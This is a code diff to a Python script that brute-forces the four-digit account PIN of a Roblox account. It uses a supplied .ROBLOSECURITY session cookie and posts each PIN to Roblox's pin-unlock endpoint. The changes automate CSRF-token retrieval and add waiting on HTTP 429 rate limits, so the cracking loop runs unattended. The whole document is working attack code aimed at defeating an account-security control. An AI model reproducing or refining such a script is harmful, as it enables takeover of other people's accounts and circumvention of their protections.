@@ -34,7 +34,6 @@ while True:
     except:
         print("Cookie Invalid")
 
-token = input("Enter X Crsf Token (If Not Valid Program Will Not Work): ")
 
 while True:
     try:
@@ -50,6 +49,8 @@ combs = ['0000', '0001', '0002', '0003', '0004', '0005', '0006', '0007', '0008',
 req = requests.session()
 req.cookies.set(".ROBLOSECURITY", str(cookie), domain="roblox.com")
 url = "https://auth.roblox.com/v1/account/pin/unlock"
+lol = req.post("https://auth.roblox.com/v1/account/pin/unlock")
+token = str(lol.headers["x-csrf-token"])
 headers = {
     "x-csrf-token": token
 }
@@ -65,21 +66,16 @@ for pin in combs:
             "pin": int(pin)
             }
             re = req.post(url=url, headers=headers, json=json)
-            le = str(re.text)
+            lol = req.post("https://auth.roblox.com/v1/account/pin/unlock")
+            token = str(lol.headers["x-csrf-token"])
             re = str(re)
-            if '"code":0' in le:
-                print(colorama.Fore.RED + "X Crsf Token Have Expired/Invalid, Enter The New One: ")
-                token = input("> ")
-                headers = {
-                    "x-csrf-token": token
-                }
             if "200" in re:
                 print(colorama.Fore.GREEN + "Succsesfully Cracked Pin, Pin Is " + str(pin))
                 input("")
                 input("")
                 input("")
                 exit()
-            if "404" in re:
+            if "429" in re:
                 print(colorama.Fore.RED + "Rate Limited, Sleeping For " + str(delay) + " Seconds")
                 time.sleep(float(delay))
             if "403" in re:
